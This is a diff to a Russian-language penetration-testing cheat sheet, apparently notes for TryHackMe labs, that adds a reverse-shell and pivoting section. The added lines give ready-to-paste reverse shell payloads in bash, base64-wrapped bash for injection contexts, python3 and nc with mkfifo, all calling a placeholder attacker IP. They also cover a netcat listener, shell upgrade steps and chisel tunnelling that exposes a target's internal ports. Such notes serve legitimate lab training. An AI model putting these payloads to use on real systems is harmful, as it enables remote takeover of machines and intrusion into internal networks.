@@ -134,9 +134,9 @@ aws dynamodb scan --table-name <TABLE> --region <region>
 Серт раскрывает поддомены в SAN, которых нет в словарях.
 
 echo | openssl s_client -connect <host>:443 2>/dev/null | openssl x509 -noout -text
-  # смотри: Subject, Subject Alternative Name (SAN) — там поддомены
+  - смотри: Subject, Subject Alternative Name (SAN) — там поддомены
 echo | openssl s_client -connect <host>:443 -servername <vhost> 2>/dev/null | openssl x509 -noout -text
-  # -servername = серт конкретного vhost (не главного домена)
+  - -servername = серт конкретного vhost (не главного домена)
 
 ### dig / host — DNS-записи
 
@@ -231,3 +231,51 @@ https://www.revshells.com/
 Выбираешь тип shell (bash/python/nc/php/perl...) + вводишь свой IP:порт → готовая
 команда для вставки. Не надо составлять вручную. Есть listener-команды тоже.
 Механика: ЖЕРТВА подключается к АТАКУЮЩЕМУ (обходит firewall — исходящие разрешены).
+
+### Listener (на своей Kali — принять shell)
+nc -lvnp 4444        # -l слушать, -v verbose, -n no-DNS, -p порт
+
+### Частые reverse shell payloads (подставить свой IP:порт)
+# bash
+bash -i >& /dev/tcp/IP/4444 0>&1
+
+# bash через base64 (обход проблем с кавычками в инъекциях — SSTI/YAML/cmd injection)
+echo -n 'bash -i >& /dev/tcp/IP/4444 0>&1' | base64      # закодировать на Kali
+# в payload: echo <base64> | base64 -d | bash
+
+# python3
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+# nc без -e (mkfifo) — если нет nc -e
+mkfifo /tmp/f; nc IP 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+### Апгрейд «немого» shell до интерактивного
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# затем Ctrl+Z → stty raw -echo; fg → Enter (полный TTY: стрелки, автодополнение)
+
+### Грабли reverse shell
+- IP = ТВОЙ (tun0 в THM: ip a | grep tun0), НЕ жертвы
+- порт listener = порт в payload (совпадают)
+- в инъекциях (SSTI/YAML/cmd) кавычки ломаются → base64-обёртка спасает
+- "connect from [IP]" в listener = shell прилетел (печатай вслепую whoami/id)
+
+---
+## Pivoting / туннелирование
+
+### chisel — проброс внутренних портов цели на свою Kali
+Проблема: сервисы цели на 127.0.0.1 (localhost) снаружи недоступны — только curl изнутри shell.
+chisel пробрасывает их на Kali, чтобы открыть в браузере.
+
+# 1. на СВОЕЙ Kali — сервер (слушает)
+chisel server -p 9999 --reverse
+
+# 2. доставить chisel на цель (python3 -m http.server на Kali → wget на цели)
+
+# 3. на ЦЕЛИ — клиент (пробрасывает порты цели к тебе)
+./chisel client <KALI_IP>:9999 R:3000:127.0.0.1:3000 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
+# R:локальный_порт:цель_хост:цель_порт — теперь на Kali 127.0.0.1:3000 = сервис цели
+
+### Грабли chisel
+- ПОРЯДОК: сначала сервер на Kali, потом клиент на цели
+- "connection refused" у клиента = сервер не запущен / не тот IP:порт
+- KALI_IP = tun0 (проверь ip a | grep tun0)
